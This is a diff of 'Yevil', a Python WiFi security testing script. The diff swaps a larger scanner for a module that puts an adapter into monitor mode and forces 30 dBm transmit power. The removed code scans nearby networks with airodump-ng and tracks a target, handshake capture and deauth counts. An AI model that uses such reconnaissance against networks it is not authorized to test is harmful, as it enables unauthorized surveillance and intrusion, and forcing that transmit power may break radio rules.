@@ -1,190 +1,40 @@
 #!/usr/bin/env python3
 """
 Yevil - WiFi Security Testing Tool
-Advanced WiFi Security Testing Tool for Educational Purposes
-Version: 2.0.0
+Step 1: Adapter Detection & Monitor Mode with TX Power 30
 """
 
 import os
 import sys
 import subprocess
-import importlib
-import time
 import re
-import json
-import threading
-import shutil
-from datetime import datetime
-from typing import List, Dict, Optional, Tuple
-from pathlib import Path
+import time
 
 # ============================================
-# VIRTUAL ENVIRONMENT SETUP
+# COLORS
 # ============================================
 
-VENV_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "yevil_env")
-
-def setup_virtual_environment():
-    """Create and setup virtual environment for Yevil"""
-    print("\n[+] Setting up virtual environment for Yevil...")
+class Colors:
+    red = '\033[91m'
+    green = '\033[92m'
+    yellow = '\033[93m'
+    blue = '\033[94m'
+    cyan = '\033[96m'
+    magenta = '\033[95m'
+    white = '\033[97m'
+    reset = '\033[0m'
+    bold = '\033[1m'
     
-    if os.path.exists(VENV_DIR):
-        print("[+] Virtual environment already exists")
-        return True
-    
-    try:
-        print("[+] Creating virtual environment...")
-        subprocess.run([sys.executable, '-m', 'venv', VENV_DIR], check=True)
-        print("[+] Virtual environment created successfully!")
-        return True
-    except subprocess.CalledProcessError:
-        print("[!] Failed to create virtual environment. Installing python3-venv...")
-        try:
-            subprocess.run(['sudo', 'apt-get', 'install', '-y', 'python3-venv'], check=True)
-            subprocess.run([sys.executable, '-m', 'venv', VENV_DIR], check=True)
-            print("[+] Virtual environment created successfully!")
-            return True
-        except:
-            print("[!] Please install python3-venv manually:")
-            print("    sudo apt-get install python3-venv")
-            return False
-
-def get_venv_python():
-    """Get path to virtual environment Python"""
-    if sys.platform == 'win32':
-        return os.path.join(VENV_DIR, 'Scripts', 'python.exe')
-    else:
-        return os.path.join(VENV_DIR, 'bin', 'python')
-
-def get_venv_pip():
-    """Get path to virtual environment pip"""
-    if sys.platform == 'win32':
-        return os.path.join(VENV_DIR, 'Scripts', 'pip.exe')
-    else:
-        return os.path.join(VENV_DIR, 'bin', 'pip')
-
-def install_in_venv(package):
-    """Install package in virtual environment"""
-    pip_path = get_venv_pip()
-    try:
-        subprocess.run([pip_path, 'install', package], check=True, capture_output=True)
-        return True
-    except:
-        return False
-
-def install_dependencies_venv():
-    """Install all dependencies in virtual environment"""
-    print("\n[+] Installing dependencies in virtual environment...")
-    
-    packages = ['scapy', 'wifi', 'colorama', 'tqdm', 'netifaces']
-    
-    pip_path = get_venv_pip()
-    try:
-        subprocess.run([pip_path, 'install', '--upgrade', 'pip'], check=True, capture_output=True)
-    except:
-        pass
-    
-    for package in packages:
-        print(f"   Installing {package}...")
-        if install_in_venv(package):
-            print(f"   ✓ {package} installed")
-        else:
-            print(f"   ✗ Failed to install {package}")
-            return False
-    
-    print("[+] All dependencies installed successfully!")
-    return True
-
-def check_system_deps():
-    """Check system dependencies"""
-    print("\n[+] Checking system dependencies...")
-    
-    system_packages = ['aircrack-ng', 'iw', 'wireless-tools', 'airmon-ng']
-    missing = []
-    
-    for pkg in system_packages:
-        try:
-            subprocess.run(['which', pkg], check=True, capture_output=True)
-            print(f"   ✓ {pkg} installed")
-        except:
-            missing.append(pkg)
-            print(f"   ✗ {pkg} missing")
-    
-    if missing:
-        print(f"\n[!] Missing system packages: {', '.join(missing)}")
-        try:
-            subprocess.run(['sudo', 'apt-get', 'update', '-y'], check=True)
-            subprocess.run(['sudo', 'apt-get', 'install', '-y'] + missing, check=True)
-            print("[+] System packages installed successfully!")
-        except:
-            print("[!] Failed to install system packages")
-            print("[!] Please run: sudo apt-get install " + ' '.join(missing))
-            return False
-    
-    return True
+    @staticmethod
+    def print_colored(text: str, color: str = 'white', bold: bool = False):
+        style = Colors.bold if bold else ''
+        print(f"{style}{getattr(Colors, color, '')}{text}{Colors.reset}")
 
 # ============================================
-# MAIN EXECUTION WITH VENV HANDLING
+# BANNER
 # ============================================
 
-if not sys.executable.startswith(VENV_DIR):
-    print("\n[+] Checking Python environment...")
-    
-    if os.geteuid() != 0:
-        print("[!] This tool requires root privileges!")
-        print("[!] Please run with: sudo python3 yevil.py")
-        sys.exit(1)
-    
-    if not check_system_deps():
-        print("[!] Please install system dependencies and try again.")
-        sys.exit(1)
-    
-    if not setup_virtual_environment():
-        print("[!] Failed to setup virtual environment")
-        sys.exit(1)
-    
-    if not install_dependencies_venv():
-        print("[!] Failed to install dependencies")
-        sys.exit(1)
-    
-    venv_python = get_venv_python()
-    if os.path.exists(venv_python):
-        print("[+] Starting Yevil in virtual environment...")
-        os.execv(venv_python, [venv_python] + sys.argv)
-    else:
-        print("[!] Virtual environment Python not found")
-        sys.exit(1)
-
-# ============================================
-# NOW RUNNING IN VIRTUAL ENVIRONMENT
-# ============================================
-
-try:
-    import scapy
-    import wifi
-    import colorama
-    import tqdm
-    import netifaces
-except ImportError as e:
-    print(f"[!] Error importing: {e}")
-    print("[!] Installing missing packages in virtual environment...")
-    install_dependencies_venv()
-    print("[+] Restarting...")
-    os.execv(sys.executable, sys.argv)
-
-# ============================================
-# IMPORTS
-# ============================================
-
-import scapy.all as scapy
-from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeReq
-from scapy.layers.eap import EAPOL
-
-# ============================================
-# YEVIL BANNER
-# ============================================
-
-YEVILL_BANNER = """
+BANNER = """
 \033[96m
 ╔═══════════════════════════════════════════════════════════════╗
 ║                                                               ║
@@ -195,7 +45,7 @@ YEVILL_BANNER = """
 ║       ██║   ███████╗ ╚████╔╝ ██║███████╗                     ║
 ║       ╚═╝   ╚══════╝  ╚═══╝  ╚═╝╚══════╝                     ║
 ║                                                               ║
-║           WiFi Security Testing Tool v2.0.0                   ║
+║           WiFi Security Testing Tool v1.0.0                   ║
 ║           ⚠️  For Educational Purposes Only!                  ║
 ║                                                               ║
 ╚═══════════════════════════════════════════════════════════════╝
@@ -203,63 +53,25 @@ YEVILL_BANNER = """
 """
 
 # ============================================
-# COLOR CLASS
+# ADAPTER HANDLER CLASS
 # ============================================
 
-class Colors:
-    """Color definitions for terminal"""
-    red = '\033[91m'
-    green = '\033[92m'
-    yellow = '\033[93m'
-    blue = '\033[94m'
-    magenta = '\033[95m'
-    cyan = '\033[96m'
-    white = '\033[97m'
-    reset = '\033[0m'
-    bold = '\033[1m'
-    
-    @staticmethod
-    def print_colored(text: str, color: str = 'white', bold: bool = False):
-        """Print colored text"""
-        style = Colors.bold if bold else ''
-        print(f"{style}{getattr(Colors, color, '')}{text}{Colors.reset}")
-
-# ============================================
-# YEVIL TOOL CLASS
-# ============================================
-
-class YevilTool:
-    """Yevil - Advanced WiFi Security Testing Tool"""
+class AdapterHandler:
+    """Handle WiFi adapter detection and monitor mode setup"""
     
     def __init__(self):
-        self.adapter = None
-        self.original_adapter = None
-        self.available_adapters = []
-        self.external_adapters = []
-        self.networks = []
-        self.target_bssid = None
-        self.target_channel = None
-        self.handshake_captured = False
-        self.running = True
-        self.packet_count = 0
-        self.deauth_packets_sent = 0
+        self.adapters = []
+        self.selected_adapter = None
+        self.monitor_interface = None
         
-    def print_banner(self):
-        """Display Yevil banner"""
-        print(YEVILL_BANNER)
-    
-    def check_root(self):
-        """Check if running as root"""
-        if os.geteuid() != 0:
-            Colors.print_colored("[!] This tool requires root privileges!", 'red', True)
-            Colors.print_colored("[!] Please run with: sudo python3 yevil.py", 'yellow')
-            sys.exit(1)
-    
-    def get_all_adapters(self) -> List[str]:
-        """Get all wireless adapters"""
+    def detect_adapters(self) -> list:
+        """Detect all wireless adapters"""
+        Colors.print_colored("\n[+] Scanning for wireless adapters...", 'cyan', True)
+        
         adapters = []
+        
         try:
-            # Method 1: iwconfig
+            # Method 1: Using iwconfig
             result = subprocess.run(['iwconfig'], capture_output=True, text=True)
             for line in result.stdout.split('\n'):
                 if 'IEEE 802.11' in line:
@@ -267,7 +79,7 @@ class YevilTool:
                     if adapter not in adapters:
                         adapters.append(adapter)
             
-            # Method 2: ip link
+            # Method 2: Using ip link
             result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
             for line in result.stdout.split('\n'):
                 if 'wlan' in line.lower() or 'wlp' in line.lower():
@@ -277,893 +89,296 @@ class YevilTool:
                         if adapter not in adapters:
                             adapters.append(adapter)
             
-            # Method 3: /sys/class/net/
+            # Method 3: Check /sys/class/net/
             if os.path.exists('/sys/class/net/'):
                 for device in os.listdir('/sys/class/net/'):
                     if device.startswith('wlan') or device.startswith('wlp') or 'mon' in device:
                         if device not in adapters:
                             adapters.append(device)
-        except:
-            pass
+        
+        except Exception as e:
+            Colors.print_colored(f"[-] Error detecting adapters: {e}", 'red')
+        
+        self.adapters = adapters
+        
+        if adapters:
+            Colors.print_colored(f"[+] Found {len(adapters)} adapter(s)", 'green')
+        else:
+            Colors.print_colored("[!] No wireless adapters found!", 'yellow')
         
         return adapters
     
-    def detect_external_adapters(self) -> List[str]:
-        """Detect external USB wireless adapters"""
-        Colors.print_colored("\n[+] Detecting external USB wireless adapters...", 'cyan', True)
+    def get_adapter_info(self, adapter: str) -> dict:
+        """Get detailed information about an adapter"""
+        info = {
+            'name': adapter,
+            'driver': 'Unknown',
+            'chipset': 'Unknown',
+            'tx_power': 'Unknown',
+            'mode': 'Unknown',
+            'channel': 'Unknown',
+            'frequency': 'Unknown'
+        }
         
-        all_adapters = self.get_all_adapters()
-        external = []
+        Colors.print_colored(f"\n[+] Getting info for: {adapter}", 'blue')
         
-        if not all_adapters:
-            Colors.print_colored("\n[!] No wireless adapters found!", 'red')
-            return []
+        # Get driver info
+        try:
+            result = subprocess.run(['ethtool', '-i', adapter], 
+                                  capture_output=True, text=True)
+            if 'driver' in result.stdout:
+                for line in result.stdout.split('\n'):
+                    if 'driver:' in line:
+                        info['driver'] = line.split('driver:')[1].strip()
+                        break
+        except:
+            pass
         
-        Colors.print_colored(f"[+] Found {len(all_adapters)} wireless adapter(s)", 'cyan')
-        
-        for adapter in all_adapters:
-            print(f"\n   Checking: {adapter}")
+        # Get iwconfig info
+        try:
+            result = subprocess.run(['iwconfig', adapter], capture_output=True, text=True)
             
-            is_usb = False
-            reason = ""
-            
-            # Method 1: Check if already in monitor mode
-            if 'mon' in adapter:
-                is_usb = True
-                reason = "Monitor mode interface"
-                Colors.print_colored(f"   ✅ {adapter} is MONITOR mode interface", 'green')
-                external.append(adapter)
-                continue
-            
-            # Method 2: Check USB subsystem
-            try:
-                result = subprocess.run(
-                    ['readlink', '-f', f'/sys/class/net/{adapter}/device'],
-                    capture_output=True, text=True
-                )
-                if 'usb' in result.stdout.lower():
-                    is_usb = True
-                    reason = "USB device path"
-                    Colors.print_colored(f"   ✅ {adapter} is EXTERNAL (USB)", 'green')
-            except:
-                pass
-            
-            # Method 3: Check driver
-            if not is_usb:
-                try:
-                    result = subprocess.run(['ethtool', '-i', adapter], 
-                                          capture_output=True, text=True)
-                    if 'driver' in result.stdout:
-                        driver = result.stdout.split('driver:')[1].split()[0] if 'driver:' in result.stdout else ''
-                        
-                        # Check if driver is USB
-                        usb_drivers = ['rtl', 'mt76', 'ath9k_htc', 'rtl88', 'rtl818', '8812', '88XX', 'ath', 'ar']
-                        if any(drv in driver.lower() for drv in usb_drivers):
-                            is_usb = True
-                            reason = f"USB driver: {driver}"
-                            Colors.print_colored(f"   ✅ {adapter} is EXTERNAL (driver: {driver})", 'green')
-                except:
-                    pass
-            
-            # Method 4: Check with lsusb
-            if not is_usb:
-                try:
-                    result = subprocess.run(['lsusb'], capture_output=True, text=True)
-                    usb_chipsets = ['Realtek', 'RTL', 'Atheros', 'MediaTek', 'Ralink', 'TP-Link']
-                    for chipset in usb_chipsets:
-                        if chipset.lower() in result.stdout.lower():
-                            is_usb = True
-                            reason = f"USB chipset: {chipset}"
-                            Colors.print_colored(f"   ✅ {adapter} is EXTERNAL (USB chipset detected)", 'green')
-                            break
-                except:
-                    pass
-            
-            # Method 5: Check via udev
-            if not is_usb:
-                try:
-                    result = subprocess.run(['udevadm', 'info', '--query=property', f'--name={adapter}'], 
-                                          capture_output=True, text=True)
-                    if 'ID_BUS=usb' in result.stdout:
-                        is_usb = True
-                        reason = "USB bus detected"
-                        Colors.print_colored(f"   ✅ {adapter} is EXTERNAL (USB bus)", 'green')
-                except:
-                    pass
-            
-            # Method 6: Check if TP-Link
-            if not is_usb:
-                try:
-                    result = subprocess.run(['lsusb'], capture_output=True, text=True)
-                    if 'TP-Link' in result.stdout or 'TL-WN' in result.stdout:
-                        is_usb = True
-                        reason = "TP-Link adapter detected"
-                        Colors.print_colored(f"   ✅ {adapter} is EXTERNAL (TP-Link)", 'green')
-                except:
-                    pass
-            
-            if is_usb:
-                external.append(adapter)
+            # Get mode
+            if 'Mode:Monitor' in result.stdout:
+                info['mode'] = 'Monitor'
+            elif 'Mode:Managed' in result.stdout:
+                info['mode'] = 'Managed'
+            elif 'Mode:Master' in result.stdout:
+                info['mode'] = 'Master'
             else:
-                Colors.print_colored(f"   ❌ {adapter} is INTERNAL (built-in)", 'red')
+                match = re.search(r'Mode:(\w+)', result.stdout)
+                if match:
+                    info['mode'] = match.group(1)
+            
+            # Get channel
+            match = re.search(r'Channel:(\d+)', result.stdout)
+            if match:
+                info['channel'] = match.group(1)
+            
+            # Get frequency
+            match = re.search(r'Frequency:([\d.]+)', result.stdout)
+            if match:
+                info['frequency'] = match.group(1)
+            
+            # Get TX power
+            match = re.search(r'Tx-Power:([\d.]+)\s*dBm', result.stdout)
+            if match:
+                info['tx_power'] = match.group(1)
+            
+        except:
+            pass
         
-        self.available_adapters = all_adapters
-        self.external_adapters = external
+        # Try to get chipset from lsusb
+        try:
+            result = subprocess.run(['lsusb'], capture_output=True, text=True)
+            usb_chipsets = {
+                'RTL8812': 'Realtek RTL8812AU',
+                'RTL8188': 'Realtek RTL8188',
+                'AR9271': 'Atheros AR9271',
+                'MT7601': 'MediaTek MT7601',
+                'Ralink': 'Ralink',
+                'TP-Link': 'TP-Link'
+            }
+            
+            for chipset in usb_chipsets:
+                if chipset.lower() in result.stdout.lower():
+                    info['chipset'] = usb_chipsets[chipset]
+                    break
+        except:
+            pass
         
-        if external:
-            Colors.print_colored(f"\n[+] Found {len(external)} external adapter(s): {', '.join(external)}", 'green', True)
-        else:
-            Colors.print_colored("\n[!] No external USB adapters detected!", 'yellow', True)
-            Colors.print_colored("[!] Please connect a USB WiFi adapter", 'yellow')
-            Colors.print_colored("\n📌 Supported adapters:", 'cyan')
-            Colors.print_colored("   • TP-Link TL-WN722N", 'white')
-            Colors.print_colored("   • Alfa AWUS036ACH", 'white')
-            Colors.print_colored("   • Alfa AWUS036NHA", 'white')
-            Colors.print_colored("   • Any USB WiFi adapter with monitor mode support", 'white')
+        return info
+    
+    def display_adapter_info(self, info: dict):
+        """Display adapter information in a formatted table"""
+        Colors.print_colored("\n" + "="*60, 'cyan')
+        Colors.print_colored("📡 ADAPTER INFORMATION", 'cyan', True)
+        Colors.print_colored("="*60, 'cyan')
         
-        return external
+        print(f"  Name        : {info['name']}")
+        print(f"  Driver      : {info['driver']}")
+        print(f"  Chipset     : {info['chipset']}")
+        print(f"  Mode        : {info['mode']}")
+        print(f"  Channel     : {info['channel']}")
+        print(f"  Frequency   : {info['frequency']} GHz")
+        print(f"  TX Power    : {info['tx_power']} dBm")
+        print("="*60)
     
     def set_monitor_mode(self, adapter: str) -> bool:
-        """Set adapter to monitor mode automatically"""
-        Colors.print_colored(f"\n[+] Setting {adapter} to monitor mode...", 'cyan', True)
-        self.original_adapter = adapter
+        """Set adapter to monitor mode with TX power 30"""
+        Colors.print_colored(f"\n[+] Setting {adapter} to monitor mode with TX Power 30...", 'cyan', True)
         
         try:
-            # Kill processes that might interfere
+            # Step 1: Kill interfering processes
             Colors.print_colored("[+] Killing interfering processes...", 'blue')
             subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                          capture_output=True, text=True)
             time.sleep(1)
             
-            # Try airmon-ng first
+            # Step 2: Bring interface down
+            Colors.print_colored("[+] Bringing interface down...", 'blue')
+            subprocess.run(['sudo', 'ip', 'link', 'set', adapter, 'down'], 
+                         check=True, capture_output=True)
+            
+            # Step 3: Set monitor mode
+            Colors.print_colored("[+] Setting monitor mode...", 'blue')
+            subprocess.run(['sudo', 'iw', 'dev', adapter, 'set', 'type', 'monitor'], 
+                         check=True, capture_output=True)
+            
+            # Step 4: Bring interface up
+            Colors.print_colored("[+] Bringing interface up...", 'blue')
+            subprocess.run(['sudo', 'ip', 'link', 'set', adapter, 'up'], 
+                         check=True, capture_output=True)
+            
+            # Step 5: Set TX power to 30
+            Colors.print_colored("[+] Setting TX power to 30 dBm...", 'blue')
             try:
-                Colors.print_colored("[+] Using airmon-ng...", 'blue')
-                result = subprocess.run(['sudo', 'airmon-ng', 'start', adapter], 
-                                      capture_output=True, text=True)
-                print(result.stdout)  # Debug output
+                subprocess.run(['sudo', 'iw', 'dev', adapter, 'set', 'txpower', 'fixed', '30'], 
+                             check=True, capture_output=True)
+            except:
+                Colors.print_colored("[!] Could not set TX power to 30. Trying 20...", 'yellow')
+                try:
+                    subprocess.run(['sudo', 'iw', 'dev', adapter, 'set', 'txpower', 'fixed', '20'], 
+                                 check=True, capture_output=True)
+                except:
+                    Colors.print_colored("[!] Could not set TX power. Using default.", 'yellow')
+            
+            self.monitor_interface = adapter
+            Colors.print_colored(f"\n[+] ✅ {adapter} is now in MONITOR MODE!", 'green', True)
+            
+            # Verify monitor mode
+            result = subprocess.run(['iwconfig', adapter], capture_output=True, text=True)
+            if 'Mode:Monitor' in result.stdout:
+                Colors.print_colored("[+] Verified: Monitor mode active ✓", 'green')
                 
-                # Look for the monitor interface name
-                for line in result.stdout.split('\n'):
-                    if 'mon' in line and adapter in line:
-                        match = re.search(r'(\w+mon\d*)', line)
-                        if match:
-                            self.adapter = match.group(1)
-                            Colors.print_colored(f"[+] Monitor mode enabled on {self.adapter}", 'green')
-                            return True
-            except Exception as e:
-                Colors.print_colored(f"   airmon-ng failed: {e}", 'yellow')
+                # Check TX power
+                match = re.search(r'Tx-Power:([\d.]+)\s*dBm', result.stdout)
+                if match:
+                    Colors.print_colored(f"[+] TX Power: {match.group(1)} dBm ✓", 'green')
+                else:
+                    Colors.print_colored("[+] TX Power: Set successfully ✓", 'green')
+            else:
+                Colors.print_colored("[!] Could not verify monitor mode", 'yellow')
             
-            # Check if monitor interface already exists
-            monitor_interfaces = [dev for dev in self.get_all_adapters() if 'mon' in dev]
-            if monitor_interfaces:
-                self.adapter = monitor_interfaces[0]
-                Colors.print_colored(f"[+] Found existing monitor interface: {self.adapter}", 'green')
-                return True
-            
-            # Manual method if airmon-ng fails
-            Colors.print_colored("[+] Manual monitor mode setup...", 'blue')
-            commands = [
-                f'sudo ip link set {adapter} down',
-                f'sudo iw dev {adapter} set type monitor',
-                f'sudo ip link set {adapter} up'
-            ]
-            for cmd in commands:
-                subprocess.run(cmd.split(), check=True, capture_output=True)
-            
-            self.adapter = adapter
-            Colors.print_colored(f"[+] Monitor mode enabled on {self.adapter}", 'green')
             return True
-                
+            
         except Exception as e:
             Colors.print_colored(f"[-] Failed to set monitor mode: {e}", 'red')
             return False
     
-    def draw_wifi_animation(self):
-        """Draw WiFi scanning animation"""
-        frames = [
-            """
-\033[96m
-    ╔═══════════════════════════════════════════════════════════════╗
-    ║                  🔍 SCANNING WiFi NETWORKS                    ║
-    ║                                                               ║
-    ║                      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄                        ║
-    ║                   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄                     ║
-    ║                ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄                  ║
-    ║             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄               ║
-    ║          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ║
-    ║       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄         ║
-    ║    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄      ║
-    ║                                                               ║
-    ║            Scanning for networks in range...                  ║
-    ║                                                               ║
-    ╚═══════════════════════════════════════════════════════════════╝
-\033[0m
-            """,
-            """
-\033[96m
-    ╔═══════════════════════════════════════════════════════════════╗
-    ║                  📡 SCANNING WiFi NETWORKS                    ║
-    ║                                                               ║
-    ║    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
-    ║    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
-    ║    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
-    ║    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
-    ║    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
-    ║                                                               ║
-    ║             📶 Signal detected from networks                  ║
-    ║                                                               ║
-    ╚═══════════════════════════════════════════════════════════════╝
-\033[0m
-            """,
-            """
-\033[96m
-    ╔═══════════════════════════════════════════════════════════════╗
-    ║                  📶 SCANNING WiFi NETWORKS                    ║
-    ║                                                               ║
-    ║    ╔═══════════════════════════════════════════════════════╗  ║
-    ║    ║   WiFi Networks Found in Range:                       ║  ║
-    ║    ║   ══════════════════════════════════════════════════  ║  ║
-    ║    ║   ● Network 1: ████████████████░░░░  (Strong)        ║  ║
-    ║    ║   ● Network 2: ██████████░░░░░░░░  (Medium)          ║  ║
-    ║    ║   ● Network 3: ████░░░░░░░░░░░░░░  (Weak)            ║  ║
-    ║    ╚═══════════════════════════════════════════════════════╝  ║
-    ║                                                               ║
-    ╚═══════════════════════════════════════════════════════════════╝
-\033[0m
-            """
-        ]
+    def set_tx_power(self, adapter: str, power: int = 30) -> bool:
+        """Set TX power for adapter"""
+        Colors.print_colored(f"\n[+] Setting TX power to {power} dBm...", 'blue')
         
-        for i in range(3):
-            for frame in frames:
-                sys.stdout.write('\033[2J\033[H')
-                sys.stdout.write(frame)
-                sys.stdout.flush()
-                time.sleep(0.5)
-    
-    def parse_airodump_csv(self, filename: str) -> List[Dict]:
-        """Parse airodump-ng CSV output"""
-        networks = []
         try:
-            with open(filename, 'r') as f:
-                lines = f.readlines()
-            
-            network_start = False
-            for i, line in enumerate(lines):
-                if 'BSSID' in line and 'PWR' in line:
-                    network_start = i + 1
-                    break
-            
-            if not network_start:
-                return networks
-            
-            for line in lines[network_start:]:
-                if 'Station' in line:
-                    break
-                    
-                parts = line.strip().split(',')
-                if len(parts) >= 10 and parts[0] and parts[0] != 'BSSID':
-                    power = int(parts[8].strip()) if parts[8].strip().lstrip('-').isdigit() else 0
-                    distance = self.calculate_distance(power)
-                    
-                    network = {
-                        'bssid': parts[0].strip(),
-                        'first_seen': parts[1].strip(),
-                        'last_seen': parts[2].strip(),
-                        'channel': parts[3].strip(),
-                        'speed': parts[4].strip(),
-                        'privacy': parts[5].strip(),
-                        'cipher': parts[6].strip(),
-                        'authentication': parts[7].strip(),
-                        'power': power,
-                        'beacons': parts[9].strip(),
-                        'ssid': parts[13].strip() if len(parts) > 13 else '<Hidden>',
-                        'distance': distance
-                    }
-                    networks.append(network)
-            
-        except Exception as e:
-            Colors.print_colored(f"[-] Error parsing CSV: {e}", 'red')
-        
-        return networks
-    
-    def calculate_distance(self, signal_strength: int) -> float:
-        """Calculate approximate distance from signal strength"""
-        if signal_strength == 0:
-            return 0.0
-        try:
-            distance = 10 ** ((27.55 - (20 * 2.4) - signal_strength) / 20)
-            return round(distance, 2)
+            subprocess.run(['sudo', 'iw', 'dev', adapter, 'set', 'txpower', 'fixed', str(power)], 
+                         check=True, capture_output=True)
+            Colors.print_colored(f"[+] TX power set to {power} dBm ✓", 'green')
+            return True
         except:
-            return 0.0
+            Colors.print_colored(f"[!] Could not set TX power to {power} dBm", 'yellow')
+            return False
     
-    def draw_network_radar(self, networks: List[Dict]):
-        """Draw radar visualization showing networks by distance"""
-        if not networks:
-            return
-        
-        Colors.print_colored("\n📡 NETWORK RADAR (Distance from center)", 'cyan', True)
-        print("="*60)
-        
-        sorted_networks = sorted(networks, key=lambda x: x.get('power', 0), reverse=True)
-        top_networks = sorted_networks[:8]
-        
-        print("\n    ╔═══════════════════════════════════════════════════╗")
-        print("    ║            WiFi Networks Radar View              ║")
-        print("    ╠═══════════════════════════════════════════════════╣")
-        
-        for i, net in enumerate(top_networks, 1):
-            ssid = net['ssid'][:20] if net['ssid'] != '<Hidden>' else '<Hidden>'
-            power = net.get('power', 0)
-            distance = net.get('distance', 0)
-            
-            if distance < 10:
-                bars = "████████████████"
-                status = "🟢 Very Close"
-            elif distance < 30:
-                bars = "████████████░░░░"
-                status = "🟡 Close"
-            elif distance < 60:
-                bars = "████████░░░░░░░░"
-                status = "🟠 Medium"
-            elif distance < 100:
-                bars = "████░░░░░░░░░░░░"
-                status = "🔴 Far"
-            else:
-                bars = "██░░░░░░░░░░░░░░"
-                status = "⚫ Very Far"
-            
-            print(f"    ║ {i:2}. {ssid:<20} {bars}")
-            print(f"    ║     BSSID: {net['bssid']} | CH: {net['channel']} | {status} | {distance}m")
-            print("    ║")
-        
-        print("    ╚═══════════════════════════════════════════════════╝")
-    
-    def scan_networks(self) -> List[Dict]:
-        """Scan networks using airodump-ng - Fixed version"""
-        Colors.print_colored("\n" + "="*60, 'cyan', True)
-        Colors.print_colored("📡 YEVIL SCANNING NETWORKS", 'cyan', True)
-        Colors.print_colored("="*60, 'cyan')
-        
-        if not self.adapter:
-            Colors.print_colored("[-] No adapter in monitor mode!", 'red')
-            Colors.print_colored("[!] Please setup adapter first (Option 1)", 'yellow')
-            return []
-        
-        # Check if adapter is actually in monitor mode
-        try:
-            result = subprocess.run(['iwconfig', self.adapter], capture_output=True, text=True)
-            if 'Monitor' not in result.stdout and 'mon' not in self.adapter:
-                Colors.print_colored("[-] Adapter is not in monitor mode!", 'red')
-                Colors.print_colored("[!] Please setup monitor mode first (Option 1)", 'yellow')
-                return []
-        except:
-            pass
-        
-        self.draw_wifi_animation()
-        
-        # Verify the adapter is working
-        Colors.print_colored(f"\n[+] Using adapter: {self.adapter}", 'green')
-        Colors.print_colored(f"[+] Running: airodump-ng {self.adapter} --band abg", 'blue')
-        Colors.print_colored("[+] Scanning all networks in range...", 'yellow')
-        Colors.print_colored("[+] This will take 15-20 seconds...", 'yellow')
+    def show_adapter_status(self, adapter: str):
+        """Show current adapter status"""
+        Colors.print_colored(f"\n[+] Current status of {adapter}:", 'cyan')
         
         try:
-            # Clear previous scan results
-            subprocess.run(['rm', '-f', '/tmp/scan-01.csv', '/tmp/scan-01.cap'], capture_output=True)
-            
-            # Start airodump-ng
-            process = subprocess.Popen(
-                f'sudo airodump-ng {self.adapter} --band abg --write /tmp/scan --output-format csv --write-interval 1'.split(),
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-            
-            # Show progress with countdown
-            for i in range(15, 0, -1):
-                Colors.print_colored(f"   ⏳ Scanning... {i} seconds remaining", 'yellow', True)
-                time.sleep(1)
-            
-            # Terminate process
-            process.terminate()
-            time.sleep(2)
-            
-            # Check for results
-            if os.path.exists('/tmp/scan-01.csv'):
-                self.networks = self.parse_airodump_csv('/tmp/scan-01.csv')
-                
-                if self.networks:
-                    Colors.print_colored(f"\n[+] Found {len(self.networks)} networks!", 'green', True)
-                    self.draw_network_radar(self.networks)
-                    self.display_networks(self.networks)
-                else:
-                    Colors.print_colored("\n[!] No networks found in range!", 'yellow')
-                    Colors.print_colored("[!] Possible reasons:", 'yellow')
-                    Colors.print_colored("   1. No WiFi networks in range", 'white')
-                    Colors.print_colored("   2. Adapter not in monitor mode properly", 'white')
-                    Colors.print_colored("   3. Adapter not detecting signals", 'white')
-                    Colors.print_colored("\n[+] Try moving closer to a WiFi router", 'yellow')
-                    Colors.print_colored("[+] Try different channels", 'yellow')
-                    Colors.print_colored("[+] Try restarting the adapter", 'yellow')
-                
-                return self.networks
-            else:
-                Colors.print_colored("[-] No scan results found!", 'red')
-                Colors.print_colored("[!] Try running: sudo airodump-ng " + self.adapter, 'yellow')
-                return []
-                
-        except Exception as e:
-            Colors.print_colored(f"[-] Error scanning: {e}", 'red')
-            return []
-    
-    def display_networks(self, networks: List[Dict]):
-        """Display networks in formatted table"""
-        if not networks:
-            Colors.print_colored("\n[-] No networks found!", 'red')
-            return
-        
-        Colors.print_colored("\n" + "="*120, 'cyan')
-        Colors.print_colored("📋 COMPLETE NETWORK SCAN RESULTS", 'cyan', True)
-        Colors.print_colored("="*120, 'cyan')
-        
-        print(f"{'#':<4} {'SSID':<25} {'BSSID':<18} {'CH':<4} {'PWR':<6} {'DIST':<8} {'ENC':<8} {'AUTH':<12} {'PACKETS':<8}")
-        print("-"*120)
-        
